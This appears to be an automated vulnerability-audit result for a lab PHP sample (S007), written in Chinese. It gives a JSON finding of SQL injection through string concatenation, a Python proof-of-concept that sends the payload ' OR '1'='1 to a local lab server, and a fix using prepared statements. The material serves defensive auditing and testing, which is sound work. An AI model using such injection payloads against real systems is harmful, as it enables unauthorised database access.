@@ -1,0 +1,66 @@
+```json
+{"sample_id":"S007","prediction":"vulnerable","vulnerability_type":"SQL注入","locations":["F01:0008","F01:0011","F02:0007","F02:0008"],"evidence":{"source":"F01:0008 从 $_GET['name'] 读取外部输入，缺省为空字符串","flow":"F01:0011 将 $name 传给 find_people_by_name；F02:0007 在构造 SQL 时直接拼接 $name；F02:0008 执行该 SQL","guard":"无效：F02:0007 直接拼接 $name，未使用预处理绑定、转义或白名单；输入位于单引号字符串值中但可闭合引号并改变 SQL 结构","sink":"F02:0008 调用 $db->query($sql) 执行拼接后的 SQL"},"prerequisites":["PHP 8.5 本机服务监听 127.0.0.1:4280 并映射 /lab_cases/S007/index.php","入口加载前共享 bootstrap 已建立 mysqli 连接 $db","lab_people 表存在且含 id=1 Alice、id=2 Bob、id=3 Carol","每次请求从干净 URL 开始，无登录、会话或持久化依赖"],"missing_context":["db_connect.php 的具体实现未在片段中提供；本判断依赖运行上下文所述 $db 已建立且字符集为 utf8mb4","未提供数据库错误模式与权限细节；本验证方案为只读查询，不依赖写权限"],"poc_generated":true,"poc_language":"python3","poc_instructions":"当前仅完成模型分析，脚本未执行。运行：python3 s007_poc.py。脚本固定访问 http://127.0.0.1:4280/lab_cases/S007/index.php，不跟随重定向。普通对照 name=Alice 预期解析记录为 [(1,Alice)]；测试输入 name=' OR '1'='1 预期解析记录为 [(1,Alice),(2,Bob),(3,Carol)]。成功条件是解析后的业务记录符合该差异，不以 HTTP 200 为成功条件。若失败，检查 PHP 服务、bootstrap 中 $db、lab_people 三行数据。脚本断言通过才表示漏洞已实际触发；未运行前不得称已验证。"}
+```
+
+```python
+import http.client
+import re
+import html
+from urllib.parse import quote
+
+HOST = "127.0.0.1"
+PORT = 4280
+PATH = "/lab_cases/S007/index.php"
+TIMEOUT = 5
+
+def fetch_records(name):
+    query = quote(name, safe="")
+    path = f"{PATH}?name={query}"
+    conn = http.client.HTTPConnection(HOST, PORT, timeout=TIMEOUT)
+    try:
+        conn.request("GET", path, headers={"User-Agent": "S007-local-audit"})
+        resp = conn.getresponse()
+        status = resp.status
+        body = resp.read().decode("utf-8", errors="replace")
+    finally:
+        conn.close()
+
+    if status != 200:
+        raise RuntimeError(f"HTTP status {status}; 不跟随重定向，无法继续判断")
+
+    pattern = re.compile(r"<p>ID\s*(\d+)：([^<]+)</p>")
+    records = [
+        (html.unescape(m.group(1)), html.unescape(m.group(2)).strip())
+        for m in pattern.finditer(body)
+    ]
+    return records, body
+
+def main():
+    normal_name = "Alice"
+    test_name = "' OR '1'='1"
+
+    normal, _ = fetch_records(normal_name)
+    test, _ = fetch_records(test_name)
+
+    expected_normal = [("1", "Alice")]
+    expected_test = [("1", "Alice"), ("2", "Bob"), ("3", "Carol")]
+
+    print("普通对照 name=Alice 解析记录:", normal)
+    print("测试输入 name=' OR '1'='1 解析记录:", test)
+
+    if normal != expected_normal:
+        print("普通对照不符合预期；无法判断。检查 PHP 服务、$db 和 lab_people 数据。")
+        return 2
+
+    if test != expected_test:
+        print("测试输入未产生预期全表记录差异；漏洞未按本方案触发或前提不满足。")
+        return 3
+
+    print("断言通过：普通请求仅返回 Alice，测试请求返回 lab_people 三行；解析后的业务记录存在差异。")
+    return 0
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+防护建议（未验证）：在 F02:0007 使用 mysqli 预处理语句并将 name 作为绑定参数传入固定 SQL，不拼接外部输入；同时保持 F01:0022-F01:0023 的输出编码处理。
